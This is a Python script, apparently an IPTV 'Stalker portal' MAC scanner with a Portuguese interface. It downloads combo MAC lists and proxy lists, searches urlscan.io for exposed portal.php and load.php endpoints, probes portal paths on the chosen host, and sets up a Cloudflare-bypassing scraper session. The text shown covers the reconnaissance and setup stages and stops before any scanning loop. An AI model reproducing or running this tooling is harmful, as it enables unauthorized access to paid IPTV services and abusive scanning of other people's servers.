# -*- coding: utf-8 -*-
import datetime
import flag
import hashlib
import logging
import os
import pathlib
import pip
import platform
import random
import re
import requests
import socket
import sys
import threading
import time
import urllib
import urllib.request
from colorama import Fore
from datetime import date, datetime
from http.client import HTTPConnection, HTTPSConnection
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
def rename_terminal_session():
    if os.name == 'posix':
        os.system('echo -ne "\033]0;Auto Ultimax IP CloudFlare\007"')
    elif os.name == 'nt':
        os.system('title Auto Ultimax IP CloudFlare')
rename_terminal_session()
ESC = '\033['
RESET = ESC + '0m'
def COR(i):
    return ESC + f'1;38;5;{i}m'
def FUNDO(i):
    return ESC + f'1;48;5;{i}m'
NEGRITO = "\033[1m"
ITALICO = "\033[3m"
SUBLINHADO = "\033[4m"
PISCANTE = "\033[5m"
INVERTIDO = "\033[7m"
OCULTO = "\033[8m"
def color(i):
    return f'{ESC}1;38;5;{i}m'
def bg(i):
    return f'{ESC}1;48;5;{i}m'
def apply_bg_color(cor_texto=None, cor_fundo=None):
    cor_aplicada = color(cor_texto) if cor_texto is not None else ''
    fundo_aplicado = bg(cor_fundo) if cor_fundo is not None else ''
    return cor_aplicada + fundo_aplicado
reset = f'{ESC}0m'
terminal_width = os.get_terminal_size().columns
def clear_terminal():
    so = platform.system()
    if so in ['Windows', 'Linux', 'Darwin']:
        os.system('cls' if so == 'Windows' else 'clear')
    else:
        print("Sistema operacional não suportado.")
clear_terminal()
def sistema_operacional():
    if 'ANDROID_STORAGE' in os.environ:
        return "Aɴᴅʀᴏɪᴅ"
    elif platform.system() == 'Windows':
        return "Wɪɴᴅᴏᴡs"
    else:
        return "Oᴜᴛʀᴏ"
clear_terminal()
def criar_diretorio_e_imprimir(base_dir, sub_diretorio, nome_sistema, nome_subdiretorio):
    dir_path = os.path.join(base_dir, sub_diretorio)
    os.makedirs(dir_path, exist_ok=True)
    diretorio = (f"{COR(215)}Diretório:{COR(3)} {nome_subdiretorio} {COR(215)}criado com sucesso no "
             f"{COR(3)}{nome_sistema}.{RESET}\n{COR(229)}{dir_path}{RESET}{COR(215)}")
    sistemas = f"{COR(2)} ========================= {nome_sistema} ========================={RESET}{COR(215)}"
    centered_diretorio = diretorio.center(terminal_width)
    centered_sistemas = sistemas.center(terminal_width)
    sys.stdout.write(f"\r\n{COR(215)}⧳━─⩥⟬ {centered_sistemas.strip()} ⟭⩤─━⧳ {RESET}\n")
    sys.stdout.write(f"\r\n{COR(215)}⧳━─⩥⟬ {centered_diretorio.strip()} ⟭⩤─━⧳ {RESET}\n")
    sys.stdout.flush()
    time.sleep(1)
    return dir_path
    time.sleep(2.5)
OS = sistema_operacional()
rootDir = "/sdcard/" if OS == "Aɴᴅʀᴏɪᴅ" else os.path.expanduser('~/Documents') if OS == "Wɪɴᴅᴏᴡs" else os.path.dirname(os.path.realpath(__file__))
hits_dir = criar_diretorio_e_imprimir(rootDir, 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆', OS, '𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆')
hits_subdir_full = criar_diretorio_e_imprimir(rootDir, 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆', OS, '𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆')
hits_subdir_mini = criar_diretorio_e_imprimir(rootDir, 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑯𝒊𝒕𝒔 𝑴𝒊𝒏𝒊', OS, '𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑯𝒊𝒕𝒔 𝑴𝒊𝒏𝒊')
hits_subdir_combos = criar_diretorio_e_imprimir(rootDir, 'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔', OS, '𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔')
combo_dir = criar_diretorio_e_imprimir(rootDir, 'Combo/', OS, 'Combo')
sounds_dir = criar_diretorio_e_imprimir(rootDir, 'Sounds/', OS, 'Sounds')
proxy_dir = criar_diretorio_e_imprimir(rootDir, 'Proxy/', OS, 'Proxy')
qpython_dir = criar_diretorio_e_imprimir(rootDir, 'qpython/', OS, 'qpython')
time.sleep(2.5)
clear_terminal()
for caminho_pasta in [hits_dir, hits_subdir_full, hits_subdir_mini, hits_subdir_combos, sounds_dir]:
    os.makedirs(caminho_pasta, exist_ok=True)
def baixar_arquivo_se_nao_existir(url, caminho_local):
    if not os.path.isfile(caminho_local):
        urllib.request.urlretrieve(url, caminho_local)
        print(f'{COR(215)}Arquivo baixado em: {caminho_local}')
unique_urls_paths = {
    "http://codeskulptor-demos.commondatastorage.googleapis.com/pang/arrow.mp3": "arrow.mp3",
    "http://soundfxcenter.com/video-games/call-of-duty/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3": "8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3",
    "http://soundfxcenter.com/video-games/galaga/8d82b5_Galaga_Firing_Sound_Effect.mp3": "8d82b5_Galaga_Firing_Sound_Effect.mp3",
    "http://soundfxcenter.com/video-games/super-mario-bros/8d82b5_Super_Mario_Bros_1_Up_Sound_Effect.mp3": "8d82b5_Super_Mario_Bros_1_Up_Sound_Effect.mp3",
    "http://topbgtv.free.bg/FIKO_DIRECTORY/STBMAX5.mp3": "STBMAX5.mp3",
    "https://topbgtv.free.bg/FIKO_DIRECTORY/STBMAX3.mp3": "STBMAX3.mp3",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite": os.path.join(proxy_dir, "http_proxies.txt"),
    "https://drive.google.com/uc?export=download&id=1xc0qd3q8COpZGotHN9vIKNq_M3i7vW2x": os.path.join(combo_dir, "COMBO_Online_1.txt"),
    "https://drive.google.com/uc?export=download&id=1xPeQN0bTT7et5-q66Nj7pwVSUJyRxd7N": os.path.join(combo_dir, "COMBO_Online_2.txt"),
    "https://drive.google.com/uc?export=download&id=1xMtqxXlhrZyxBnrVpEiliyDC6oS0sD0R": os.path.join(combo_dir, "COMBO_Online_3.txt"),
    "https://josielluz.webcindario.com/Amarelinho.mp3": "Amarelinho.mp3",
}
for url, caminho in unique_urls_paths.items():
    baixar_arquivo_se_nao_existir(url, caminho)
    sounds = f"{COR(3)} {COR(215)}{caminho}"
    centered_sounds = sounds.center(terminal_width)
    sys.stdout.write(f"\r\n{COR(215)}⧳━─⩥⟬ {centered_sounds} ⟭⩤─━⧳{COR(215)}\n")
    sys.stdout.flush()
    time.sleep(1.5)
    clear_terminal()
os.system("cls" if os.name == "nt" else "clear")
try:
    pass
except ModuleNotFoundError:
    pip.main(['install', 'playsound==1.2.2'])
try:
    import urllib
except ModuleNotFoundError:
    pip.main(['install', 'urllib'])
    import urllib
try:
    import arrow
except ModuleNotFoundError:
    pip.main(['install', 'arrow'])
    import arrow
try:
    pass
except ModuleNotFoundError:
    pip.main(['install', 'babel'])
try:
    import flag
except:
    pip.main(['install', 'emoji'])
try:
    import requests
except ModuleNotFoundError:
    pip.main(['install', 'requests'])
    import requests
try:
    pass
except ModuleNotFoundError:
    pip.main(['install', 'requests[socks]'] )
    pip.main(['install', 'sock'] )
    pip.main(['install', 'socks'] )
    pip.main(['install', 'PySocks'] )
try:
    import flag
except ModuleNotFoundError:
    pip.main(['install', 'flag'])
    import flag
version=1.12
def check_os():
    """Verifica o sistema operacional e retorna o diretório raiz correspondente."""
    return './' if platform.system() == "Windows" else "/sdcard/"
def create_folders(base_path, folder_list):
    """Cria uma estrutura de pastas no diretório especificado."""
    for folder in folder_list:
        os.makedirs(base_path + folder, exist_ok=True)
rootDir = check_os()
my_os = "Wɪɴᴅᴏᴡs" if rootDir == './' else "Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_version()
folder_structure = [
    'combo/',
    'Proxy/',
    'Sounds/',
    'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/',
    'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑯𝒊𝒕𝒔 𝑴𝒊𝒏𝒊/',
    'Hits/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆/𝑨𝒖𝒕𝒐 𝑼𝒍𝒕𝒊𝒎𝒂𝒙 𝑰𝑷 𝑪𝒍𝒐𝒖𝒅𝑭𝒍𝒂𝒓𝒆 𝑪𝒐𝒎𝒃𝒐 𝑴𝒂𝒄𝒔/',
]
create_folders(rootDir, folder_structure)
print(f"\33[1;92m Sistema Operacional:\33[1;93m {my_os}\33[0m")
print(f"\33[1;92m Processador:\33[1;93m {my_cpu}\33[0m")
print(f"\33[1;92m Versão do Python:\33[1;93m {my_py}\33[0m")
print(f"\33[1;92m Versão do Script:\33[1;93m {version}\33[0m")
time.sleep(3)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
try:
    import cfscrape
    sesq= requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses= requests.Session()
os.system("cls" if os.name == "nt" else "clear")
PRL=(f"""
\n{COR(16)}{FUNDO(15)}      ★      ★      ★      ★      ★      ★       ★      ★      ★            {RESET}\33[1;38;5;3m\n
    ╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               \33[1;38;5;3m
    ║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               \33[1;38;5;3m
    ║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               \33[1;38;5;3m
    ║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               \33[1;38;5;3m
    ║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               \33[1;38;5;3m
    ╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               \33[1;38;5;3m
    ───────────────────────────║║─by Josiel Jefferson               \33[1;38;5;3m
    ───────────────────────────╚╝────Chemistry Remake               \33[1;38;5;2m
                   ___                      ___
                  (o o)                    (o o)
                 (  V  ) Josiel Jefferson (  V  )
                 --m-m----------------------m-m--
                  𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏             \33[1;0m
\n{COR(16)}{FUNDO(15)}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ       \x1b[1;0m \n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
\33[91m     ░░░░░░█░█░█░░▀█▀░▀█▀░█▄█░█▀█░█░█░░░░░░            \33[0m
\33[93m     ░░░░░░█░█░█░░░█░░░█░░█░█░█▀█░▄▀▄░░░░░░            \33[0m
\33[92m     ░░░░░░▀▀▀░▀▀▀░▀░░▀▀▀░▀░▀░▀░▀░▀░▀░░░░░░ IP CLOUDFLARE            \33[0m\n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
""")
("""       \33[1;91m  ║◌ Sɪᴅᴇ IP / Sᴄᴀɴɴ ◌║ \n""")
hitc=0
csay=0
palavras_chave_br = ["|🇧🇷", "BR|", "BRASIL", "BRAZIL", "Brasil", "Brazil", "[CH] BR - ABERTOS", "BRAZİL"]
palavras_chave_pt = ["|🇵🇹", "PT|", "PORTUGAL", "Portugal", "|🇵🇹 PT", "🇵🇹 PT", "[PT]", "PT|"]
livelist = "Lista de canais com BRASIL e Portugal disponíveis |🇧🇷 PT| BR|"
livelist_upper = livelist.upper()
num_palavras_chave_br = sum(livelist_upper.count(keyword.upper()) for keyword in palavras_chave_br)
num_palavras_chave_pt = sum(livelist_upper.count(keyword.upper()) for keyword in palavras_chave_pt)
br_detectado = num_palavras_chave_br > 0
pt_detectado = num_palavras_chave_pt > 0
categorias_ptbr = (
	f"\033[1;92m┃\33[0m├► \033[1;92m \033[1;92m●\33[0m►  《ℂ𝔸𝕋𝔼𝔾𝕆ℝ𝕀𝔸 𝔹ℝ》☞ {'Sim! 🇧🇷' if br_detectado else 'Não'} ({num_palavras_chave_br} ocorrências)\n"
	f"\033[1;92m┃\33[0m├► \033[1;92m \033[1;92m●\33[0m►  《ℂ𝔸𝕋𝔼𝔾𝕆ℝ𝕀𝔸 ℙ𝕋》☞ {'Sim! 🇵🇹' if pt_detectado else 'Não'} ({num_palavras_chave_pt} ocorrências)"
)
os.system("cls" if os.name == "nt" else "clear")
try:
	import requests
except:
	print("O módulo requests não está carregado.\nO módulo requests está sendo carregado...\n")
	pip.main(['install', 'requests'])
try:
	pass
except:
	print("O módulo sock não está carregado.\nCarregando o módulo sock...\n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
os.system('cls' if os.name == 'nt' else 'clear')
try:
    from colorama import Fore
except ModuleNotFoundError:
    pip.main(['install', 'colorama'])
    from colorama import Fore
global panel0
panel0=""
def fetch_urlscan_results(search_url):
    headers = {"Content-Type": "application/json"}
    response = requests.get(search_url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        results = []
        for result in data.get('results', []):
            page_url = result.get('page', {}).get('url', '')
            if page_url:
                page_url = page_url.replace('index.html', '').replace('portal.php', '')
                results.append(page_url)
        return results
    else:
        print(f"Falha ao buscar os resultados. Código de Status: {response.status_code}")
        return []
search_urls = [
    {"url": "https://urlscan.io/api/v1/search/?q=filename:portal.php", "name": "Online Portal.php"},
    {"url": "https://urlscan.io/api/v1/search/?q=filename:%22/c/portal.php%22", "name": "Online /c/portal.php"},
    {"url": "https://urlscan.io/api/v1/search/?q=filename:%22server/load.php%22", "name": "Online server/load.php"},
    {"url": "https://urlscan.io/api/v1/search/?q=filename:%22/Stalker_portal/server/load.php%22", "name": "Online Stalker_portal"},
    {"url": "https://urlscan.io/api/v1/search/?q=hash:df4a5acbc3cf53adcba519160ebca020ed119028c679363769ae792a36e647ac", "name": "Online 𝐬𝐊 obteve o portal oculto.php"},
    {"url": "https://urlscan.io/api/v1/search/?q=filename:JsHttpRequest.js", "name": "Busca Secreta Online"},
    {"url": "https://urlscan.io/api/v1/search/?q=hash:db350797cbda902ab47fb91960b77934108100ff40c22755f2c6a7432b4b36a6", "name": "Outro portal online.php"}
]
all_results = []
for search in search_urls:
    results = fetch_urlscan_results(search["url"])
    all_results.extend(results[:250])
unique_results = list(set(all_results))
filtered_results = [url for url in unique_results if url.endswith('/c/') or (':' in url and url.split(':')[-1].isdigit())]
os.system("cls" if os.name == "nt" else "clear")
def display_options(options):
    print(f"""
\n{COR(16)}{FUNDO(15)}      ★      ★      ★      ★      ★      ★       ★      ★      ★            {RESET}\33[1;38;5;3m\n
    ╔═══╦╗──────╔╗─────────╔═══╗──────────╔╗─╔═╗╔═╗               \33[1;38;5;3m
    ║╔══╣║─────╔╝╚╗────────║╔═╗║──────────║║─╚╗╚╝╔╝               \33[1;38;5;3m
    ║╚══╣║╔══╦═╩╗╔╬═╦══╦═╗─║╚══╦══╦══╦══╦═╝║──╚╗╔╝               \33[1;38;5;3m
    ║╔══╣║║║═╣╔═╣║║╔╣╔╗║╔╗╗╚══╗║╔╗║║═╣║═╣╔╗╠══╦╝╚╗               \33[1;38;5;3m
    ║╚══╣╚╣║═╣╚═╣╚╣║║╚╝║║║║║╚═╝║╚╝║║═╣║═╣╚╝╠═╦╝╔╗╚╗               \33[1;38;5;3m
    ╚═══╩═╩══╩══╩═╩╝╚══╩╝╚╝╚═══╣╔═╩══╩══╩══╝─╚═╝╚═╝               \33[1;38;5;3m
    ───────────────────────────║║─by Josiel Jefferson               \33[1;38;5;3m
    ───────────────────────────╚╝────Chemistry Remake               \33[1;38;5;2m
                   ___                      ___
                  (o o)                    (o o)
                 (  V  ) Josiel Jefferson (  V  )
                 --m-m----------------------m-m--
                  𝑬𝒍𝒆𝒄𝒕𝒓𝒐𝒏 𝑺𝒑𝒆𝒆𝒅-𝑿 𝒃𝒚 𝑱𝒐𝒔𝒊𝒆𝒍 𝑱𝒆𝒇𝒇𝒆𝒓𝒔𝒐𝒏             \33[1;0m
\n{COR(16)}{FUNDO(15)}        ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x ᴘʀᴏ sᴄᴀɴɴᴇʀ sᴛᴀʟᴋᴇʀ ᴘᴏʀᴛᴀʟ ᴊᴏsɪᴇʟ ᴊᴇғғᴇʀsᴏɴ       \x1b[1;0m \n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
\33[91m     ░░░░░░█░█░█░░▀█▀░▀█▀░█▄█░█▀█░█░█░░░░░░            \33[0m
\33[93m     ░░░░░░█░█░█░░░█░░░█░░█░█░█▀█░▄▀▄░░░░░░            \33[0m
\33[92m     ░░░░░░▀▀▀░▀▀▀░▀░░▀▀▀░▀░▀░▀░▀░▀░▀░░░░░░ IP CLOUDFLARE            \33[0m\n
\33[91m████████████████████████\33[93m████████████████████████\33[92m██████████████████████            \n
""")
    print("\33[92m\nDigite a URL que você deseja escanear ou selecione da lista abaixo")
    print(f"\n{apply_bg_color(cor_texto=1, cor_fundo=15)} Digite o número e pressione enter: ▼ \n{reset}")
    print("\33[93m1. Inserir host manualmente")
    for index, option in enumerate(options, start=2):
        print(f"{index}. {option['name']}")
    while True:
        try:
            selection = int(input("\nEscolha uma opção: "))
            if selection == 1:
                return None
            elif 2 <= selection <= len(options) + 1:
                return options[selection - 2]["url"]
            else:
                print("Seleção inválida. Por favor, escolha um número da lista.")
        except ValueError:
            print("Entrada inválida. Por favor, insira um número.")
def display_url_options(results):
    print("\nURLs Obtidas:")
    for index, url in enumerate(results, start=1):
        print(f"{index}. {url}")
    try:
        selection = int(input("\nSelecione uma URL pelo número: "))
        if 1 <= selection <= len(results):
            return results[selection - 1]
        else:
            print("Seleção inválida.")
            return None
    except ValueError:
        print("Entrada inválida. Por favor, insira um número.")
        return None
selected_url = display_options(search_urls)
if selected_url is not None:
    fetched_results = fetch_urlscan_results(selected_url)
    filtered_results = [url for url in fetched_results if url.endswith('/c/') or (':' in url and url.split(':')[-1].isdigit())]
    filtered_results = [url.replace('portal.php', '') for url in filtered_results]
    filtered_results = list(set(filtered_results))
    if filtered_results:
        selected_result = display_url_options(filtered_results)
        if selected_result:
            print(f"Você selecionou: {selected_result}")
            panel0 = selected_result
        else:
            print("Nenhuma seleção válida foi feita.")
    else:
        print("Nenhum resultado obtido.")
else:
    panel0 = input(f"\n\33[0;1;105m servidor:porta ☚☛  \33[0;1;7;105m")
    print(f"{RESET}")
tags = ['https://', 'http://', '/stalker_portal/c/index.html', '/stalker_portal', '/rmxportal', '/cmdforex', '/portalstb', '/magLoad', '/maglove', '/client', '/portalmega', '/ministra', '/korisnici', '/ghandi_portal', '/magaccess', '/blowportal', '/emu2', '/emu', '/tek', '/Link_OK', '/bs.mag.portal', '/bStream', '/delko', '/portal', '/c/', '/k/', '/k', '/BoSSxxxx/', '/BoSSxxxx', '/powerfull/', '/xx/', '/xx', '/', ' ']
for tag in tags:
    panel0 = panel0.replace(tag, '')
iport = ""
if "http://" in panel0 or "https://" in panel0:
    port = panel0.split(":")[1]
    panel0 = panel0.split(':')[0]
    iport = ":" + port
fyz = "http://" + panel0 + iport
os.system("cls" if os.name == "nt" else "clear")
def get_country_by_ip():
    return "US"
def get_country_name(country_code):
    if country_code == "US":
        return "United States"
    else:
        return "Unknown"
def update_country_info():
    global country_name
    while True:
        country_code = get_country_by_ip()
        if country_code:
            country_name = get_country_name(country_code)
            if not country_name:
                country_name = "Unknown"
        else:
            country_name = "Unknown"
        time.sleep(1.6)
try:
	pass
except:
	print("O módulo requests não está instalado. \nCarregando o módulo requests...\n")
	print("O módulo requests não está instalado \n Carregando o módulo requests \n")
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
panel = panel0
print(f"\n{COR(215)}Host a ser verificado:{COR(229)} {panel}")
if panel == "":
    print(
    """
[0mErro: A URL do portal não pode estar vazia!"""
    )
def extract_domain(url):
    if "http://" in url or "https://" in url:
        url = url.split("://")[1]
    if "/" in url:
        url = url.split("/")[0]
    if ":" in url:
        url = url.split(":")[0]
    return url
def resolve_domain_to_ip(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        try:
            response = requests.get(f"https://dns.google/resolve?name={domain}", timeout=3).json()
            return response.get('Answer', [{}])[0].get('data')
        except:
            return None
def get_geolocation(ip_address):
    if not ip_address:
        return "Não foi possível resolver o IP para o domínio."
    try:
        response = requests.get(f"https://ipapi.co/{ip_address}/json/",
                                headers={'User-Agent': 'Mozilla/5.0'},
                                timeout=3)
        if response.status_code == 200:
            data = response.json()
            if "error" not in data:
                return f"{data.get('country_name', 'Unknown')}, {data.get('city', 'Unknown')} (IP: {ip_address})"
    except:
        pass
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return f"{data.get('country', 'Unknown')}, {data.get('city', 'Unknown')} (IP: {ip_address})"
    except:
        pass
    return f"Não foi possível obter informações de localização para o IP: {ip_address}"
def test_portal_paths(domain, paths):
    best_portal = None
    best_score = 0
    for path in paths:
        url = f"http://{domain}{path}"
        try:
            start_time = time.time()
            response = requests.get(url, timeout=3)
            end_time = time.time()
            response_time = end_time - start_time
            if response.status_code == 200:
                content = response.text.lower()
                content_score = 0
                if "stalker" in content:
                    content_score += 10
                if "portal" in content:
                    content_score += 5
                latency_score = 1 / response_time if response_time > 0 else 0
                total_score = content_score + (latency_score * 10)
                if total_score > best_score:
                    best_score = total_score
                    best_portal = path
            print(f"\33[1;96mTestado: {Fore.GREEN}{path}\33[0m")
        except requests.RequestException:
            print(f"{Fore.RED}Falha: {Fore.LIGHTRED_EX}{path}\33[0m")
            continue
    return best_portal
portal_paths = ['/portal.php', '/c/portal.php', '/server/load.php', '/c/server/load.php', '/stalker_portal/server/load.php', '/portal.php - Real Blue', '/portal.php - httpS', '/portalott.php', '/stalker_u.php', '/stalker_portal/server/load.php - old', '/stalker_portal/server/load.php - «▣»', '/stalker_portal/server/load.php - httpS', '/BoSSxxxx/portal.php', '/magaccess/portal.php']
if panel == "":
    print(
    """
[0mErro: A URL do portal não pode estar vazia!""")
    quit()
domain = extract_domain(panel)
ip_address = resolve_domain_to_ip(domain)
if ip_address:
    print(f"\n{Fore.WHITE}IP resolvido: {Fore.GREEN}{ip_address}\33[0m")
    location = get_geolocation(ip_address)
else:
    location = "Não foi possível resolver o IP para o domínio."
    print(f"\n\33[91mAviso: O domínio parece estar offline ou inacessível\33[0m")
    if input("\n\33[95;96mVocê deseja continuar testando os caminhos do portal mesmo assim? (s/n): \33[0m").lower() != 's':
        print("\n\33[91mSaindo...\33[0m")
        exit()
print(f"\n{Fore.LIGHTYELLOW_EX}Localização de VPN sugerida: {Fore.GREEN}{location}\33[0m")
print(f"\n{Fore.MAGENTA}Testando caminhos do portal...\33[0m\n")
best_portal = test_portal_paths(domain, portal_paths)
if best_portal:
    print(f"\n\33[92;96mMelhor caminho do portal: \33[97m{best_portal}\33[0m")
else:
    print("\n\33[91mNenhum portal válido encontrado.\33[0m")
input("\n\33[91mPressione Enter para continuar...\33[0m")
os.system("cls" if os.name == "nt" else "clear")
try:
    sesq = requests.Session()
    option = cfscrape.create_scraper(sess=sesq)
except:
    option = requests.Session()
sidepanel = 'fault'
csay = 0
say = 0
hitc = 0
maca = 0
form = ""
links = []
pattern = '(\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2}:\\w{2})'
os.system("cls" if os.name == "nt" else "clear")
try:
    import platform
except:
    pip.main(['install', 'platform'])
    import platform
uname = platform.uname()
my_cpu = platform.machine()
my_py = platform.python_implementation()
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
global kate
kate=""
